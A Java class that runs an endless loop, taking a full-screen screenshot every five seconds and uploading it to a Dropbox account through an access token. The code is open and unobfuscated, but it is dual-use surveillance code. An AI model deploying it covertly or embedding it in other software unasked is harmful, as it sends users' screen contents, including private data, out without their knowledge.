import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ScreenshoterThread extends Thread {

    private DbxClientV2 client = null;

    public ScreenshoterThread(String dropboxAccessToken) {

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        client = new DbxClientV2(config, dropboxAccessToken);
    }

    public void run() {

        if (client == null) {

            System.out.println("Client not connected!");
            return;
        }

        for (;;) {

            try {

                BufferedImage screenshot = makeScreenshot();
                InputStream screenshotStream = bufferedImageToInputStream(screenshot);
                uploadToDropbox(screenshotStream);

                sleep(5000);

            } catch (InterruptedException sleepE) {
                System.out.println("Error with sleep method:");
                sleepE.printStackTrace();
            } catch (java.awt.AWTException screenshotE) {
                System.out.println("Error with screenshot method:");
                screenshotE.printStackTrace();
            } catch (java.io.IOException inputE) {
                System.out.println("Error with screenshot convert method:");
                inputE.printStackTrace();
            } catch (com.dropbox.core.DbxException dropboxE) {
                System.out.println("Error with screenshot upload method:");
                dropboxE.printStackTrace();
            }
        }
    }

    private String formatCurrentDate() {

        return new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
    }

    private InputStream bufferedImageToInputStream(BufferedImage image) throws IOException {

        ByteArrayOutputStream os = new ByteArrayOutputStream();
        ImageIO.write(image, "png", os);
        return new ByteArrayInputStream(os.toByteArray());
    }

    private BufferedImage makeScreenshot() throws java.awt.AWTException {

        return new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
    }

    private void uploadToDropbox(InputStream imageInputStream) throws com.dropbox.core.DbxException, java.io.IOException {

        String screenshotName = "/screenshot_" + formatCurrentDate() + ".png";
        client.files().uploadBuilder(screenshotName).uploadAndFinish(imageInputStream);
        System.out.println("Screenshot " + screenshotName + " uploaded");
    }
}

